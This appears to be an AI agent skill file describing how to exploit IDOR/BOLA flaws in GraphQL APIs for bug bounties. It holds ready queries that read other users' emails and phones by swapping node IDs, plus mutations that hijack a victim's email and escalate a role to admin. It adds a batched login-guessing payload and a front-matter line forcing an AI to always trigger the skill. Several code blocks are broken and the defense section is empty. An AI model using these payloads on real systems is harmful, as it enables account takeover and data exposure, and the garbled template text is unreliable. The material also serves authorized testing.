---
name: graphql-idor
description: >
  [CRITICAL: MUST trigger this skill whenever related vulnerability testing is discussed.]
  Identify and exploit Insecure Direct Object Reference (IDOR) or Broken Object Level Authorization 
  (BOLA) vulnerabilities specifically within GraphQL APIs. This skill focuses on manipulating node 
  IDs, changing variables, and utilizing aliases to access unauthorized data.
domain: cybersecurity
subdomain: bug-hunting
category: APIs
difficulty: intermediate
estimated_time: "2-3 hours"
mitre_attack:
  tactics: [TA0001, TA0006]
  techniques: [T1190]
platforms: [web, graphql]
tags: [graphql, idor, bola, api-security, bug-hunting, authorization]
tools: [burp-suite, inql, graphql-voyager]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# GraphQL IDOR (BOLA) Exploitation

## When to Use
- When auditing modern web applications that utilize GraphQL as their API layer.
- To test the authorization controls on individual objects (nodes) within the graph, ensuring a user cannot access or modify nodes belonging to other users.


## Prerequisites
- Authorized scope and target URLs from bug bounty program
- Burp Suite Professional (or Community) configured with browser proxy
- Familiarity with OWASP Top 10 and common web vulnerability classes
- SecLists wordlists for fuzzing and enumeration

## Workflow

### Phase 1: Identifying the Schema & IDs

```text
# Concept: ```

### Phase 2: Intercepting & Modifying Queries

```graphql
# query getUser {
  user(id: "VXNlcjoxNTA=") {
    id
    email
    personalPhone
  }
}
```

```graphql
# query getUser {
  user(id: "VXNlcjoxNTE=") {
    id
    email
    personalPhone
  }
}
```

### Phase 3: Exploiting Mutations (State Changes)

```graphql
# mutation {
  updateUserProfile(input: {
    userId: "VXNlcjoxNTE=",
    email: "hacker@evil.com"
  }) {
    success
  }
}
```

### Phase 4: Batching & Aliases (Bypassing Rate Limits / Automation)

```graphql
# query {
  user1: user(id: "1") { email }
  user2: user(id: "2") { email }
  user3: user(id: "3") { email }
}
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Identify Node ] --> B{Node ID modified ]}
    B -->|Yes| C[Check Response ]
    B -->|No| D[Check Context ]
    C --> E[Verify Data ]
```


### 🏆 Elite Chaining Strategy (Top 1% Hunter Methodology)

> **Core Principle**: A single finding is a $500 report. A chained exploit is a $50,000 report.
> The top 1% of hunters spend 40+ hours on a single target, understanding it better than
> the developers who built it. They automate discovery, not exploitation.

**Chaining Decision Tree:**
```mermaid
graph TD
    A[Finding Discovered] --> B{Severity?}
    B -->|Low/Info| C[Can it enable recon?]
    B -->|Medium| D[Can it escalate access?]
    B -->|High/Crit| E[Document + PoC immediately]
    C -->|Yes| F[Chain: InfoLeak → targeted attack]
    C -->|No| G[Log but deprioritize]
    D -->|Yes| H[Chain: Medium + Priv Esc = Critical]
    D -->|No| I[Submit standalone if impact clear]
    F --> J[Re-evaluate combined severity]
    H --> J
    E --> K[Test lateral movement potential]
    J --> L[Write consolidated report with full attack chain]
    K --> L
```

**Common High-Payout Chains:**
| Chain Pattern | Typical Bounty | Example |
|--|--|--|
| SSRF → Cloud Metadata → IAM Keys | $15,000-$50,000 | Webhook URL → AWS creds → S3 data |
| Open Redirect → OAuth Token Theft | $5,000-$15,000 | Login redirect → steal auth code |
| IDOR + GraphQL Introspection | $3,000-$10,000 | Enumerate users → access any account |
| Race Condition → Financial Impact | $10,000-$30,000 | Duplicate gift cards → unlimited funds |
| XSS → ATO via Cookie Theft | $2,000-$8,000 | Stored XSS on admin page → session hijack |
| Info Disclosure → API Key Reuse | $5,000-$20,000 | JS file → hardcoded API key → admin access |

**The "Architect" vs "Scanner" Mindset:**
- ❌ **Scanner Mindset**: Run nuclei on 10,000 subdomains, submit the first hit → duplicates
- ✅ **Architect Mindset**: Spend 2 weeks mapping ONE application's business logic, RBAC model, 
  and integration seams → find what no scanner ever will

## 🔵 Blue Team Detection & Defense
- **Object-Level Authorization**: **Context-Aware Resolvers**: Key Concepts
| Concept | Description |
|---------|-------------|
| Authorization in GraphQL | |
| Global Object Identification | |


## Output Format
```
Graphql Idor — Assessment Report
============================================================
Target: [Target identifier]
Assessor: [Operator name]
Date: [Assessment date]
Scope: [Authorized scope]
MITRE ATT&CK: [Relevant technique IDs]

Findings Summary:
  [Finding 1]: [Severity] — [Brief description]
  [Finding 2]: [Severity] — [Brief description]

Detailed Results:
  Phase 1: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

  Phase 2: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

Risk Rating: [Critical/High/Medium/Low/Informational]
Recommendations:
  1. [Immediate remediation step]
  2. [Long-term hardening measure]
  3. [Monitoring/detection improvement]
```


### 📝 Elite Report Writing (Top 1% Standard)

> **"The difference between a $500 and $50,000 report is the quality of the writeup."**
> — Vickie Li, Bug Bounty Bootcamp

**Title Format**: `[VulnType] in [Component] Allows [BusinessImpact]`
- ❌ "XSS Found" → This tells the triager nothing
- ✅ "Stored XSS in /admin/comments Allows Session Hijacking of All Moderators"

**Report Structure (HackerOne-Optimized):**
1. **Summary** (2-4 sentences — triager reads only this first): What broke, how, worst-case.
2. **CVSS 4.0 Vector** — Must be defensible; wrong CVSS destroys credibility.
3. **Attack Scenario** — 3-5 sentence narrative from attacker's perspective.
4. **Impact** — MUST include at least one real number: "Affects 4.2M users" not "affects many users".
5. **Steps to Reproduce** — Deterministic. A junior dev who has never seen this bug reproduces it exactly.
6. **PoC** — Copy-paste runnable. No placeholders. Match the exact HTTP method.
7. **Remediation** — Don't say "sanitize input." Give the exact code fix, before/after.
8. **CWE + References** — SSRF→CWE-918, IDOR→CWE-639, SQLi→CWE-89, XSS→CWE-79.

**Pre-Report Verification (5 Checks):**
1. 🔍 **Hallucination Detector** — Verify endpoints, CVEs, and code paths are real
2. 🤖 **AI Writing Pattern Check** — Remove "Certainly!", "It's worth noting", generic phrasing
3. 🧪 **PoC Reproducibility** — Payload syntax valid for context? Prerequisites stated?
4. 📋 **Duplicate Detection** — Is this a scanner-generic finding? Known public disclosure?
5. 📈 **Impact Plausibility** — Severity matches technical capability? No inflation?



## 💰 Real-World Disclosed Bounties (GraphQL)

| Company | Bounty | Researcher | Technique | Year |
|---------|--------|-----------|-----------|------|
| **Facebook/Instagram** | $30,000 | (Undisclosed) | GraphQL IDOR — brute-force media IDs → expose private content | 2023 |
| **Shopify** | $5,000 | (Undisclosed) | GraphQL `BillingDocumentDownload` — predictable invoice IDs | 2024 |
| **GitLab** | $1,160 | (Undisclosed) | GraphQL `Ml::Model` — incremental IDs → access all private ML models | 2024 |

**Key Lesson**: GraphQL APIs are consistently vulnerable to IDOR because developers expose 
introspection in production and use predictable IDs. The Facebook $30K payout proves GraphQL 
IDOR can be Critical-severity when it exposes private user content at scale.

**The GraphQL attack checklist that finds real bugs:**
```graphql
# 1. Always try introspection first
{ __schema { types { name fields { name type { name } } } } }

# 2. Look for mutations that accept user-controlled IDs
mutation { updateUser(id: "VICTIM_ID", role: "admin") { id role } }

# 3. Test batching for rate-limit bypass
[{"query": "mutation { login(email:\"a@b.com\", pass:\"pass1\") { token } }"},
 {"query": "mutation { login(email:\"a@b.com\", pass:\"pass2\") { token } }"}]
```

## 💰 Real-World Disclosed Bounties (IDOR)

| Company | Bounty | Researcher | Technique | Year |
|---------|--------|-----------|-----------|------|
| **Facebook/Instagram** | $30,000 | (Undisclosed) | IDOR via GraphQL — brute-force media IDs exposed private posts/stories/reels | 2023 |
| **GitHub (SAML)** | $15,000 | (Undisclosed) | SAML authentication bug allowing cross-tenant access | 2023 |
| **Shopify** | $5,000 | (Undisclosed) | IDOR in GraphQL API — predictable billing invoice IDs → download any user's invoice PDFs | 2024 |
| **Facebook** | $4,500 | Roy Castillo | IDOR exposing user primary email addresses | 2023 |
| **GitLab ML Registry** | $1,160 | (Undisclosed) | IDOR via incremental model IDs (`gid://gitlab/Ml::Model/1000401`) → access ALL private ML models | 2024 |

**Key Lesson**: Facebook paid $30K because the IDOR exposed private Instagram content at scale—
every user's private posts/stories/reels were accessible. Shopify's $5K IDOR was in GraphQL 
billing APIs with sequential IDs. GitLab's ML model IDOR shows that new features (AI/ML) often 
ship with weaker access controls.

**The $30K formula:**
1. Find resource with sequential/predictable ID
2. Confirm cross-user access (your token, their resource)
3. Prove scale: "This affects ALL 2B Instagram users' private content"
4. Quantify: "GDPR Art. 83(5) exposure: up to €20M or 4% global turnover"

## 🔴 Red Team
- Extract assets and enumerate endpoints.
- Execute initial payloads leveraging documented vulnerabilities.

## References
- OWASP: [API1:2019 Broken Object Level Authorization](https://owasp.org/API-Security/editions/2019/en/0x11-t1/)
- PortSwigger: [GraphQL API Vulnerabilities](https://portswigger.net/web-security/graphql)
